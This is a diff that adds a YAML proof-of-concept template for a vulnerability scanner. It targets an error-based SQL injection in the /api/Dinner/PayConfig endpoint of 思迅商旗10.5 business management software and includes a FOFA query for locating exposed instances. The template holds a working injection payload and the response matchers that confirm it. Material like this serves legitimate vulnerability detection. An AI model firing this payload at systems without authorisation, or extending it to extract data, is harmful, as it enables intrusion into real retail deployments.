@@ -1,0 +1,17 @@
+id: poc-yaml-sixun-scms-payconfig-sqli
+info:
+  name: 思迅商旗10.5商业管理系统 PayConfig SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 思迅商旗商业管理系统
+  fofa: body="OnlineLogin.aspx"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /api/Dinner/PayConfig?branchno&tableno=1'+AND+1234+IN+(SELECT+(sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))))--&uuid
+  expression: status_code == 200 && contains(body,"0x" + t2) && contains(body,"<Success>false</Success>")
+    && contains(body,"DinnerResponseDTO") && matches(body,"转换成数据类型(.*?)时失败") && matches(body,"在将(.*?)值")
+transport: http
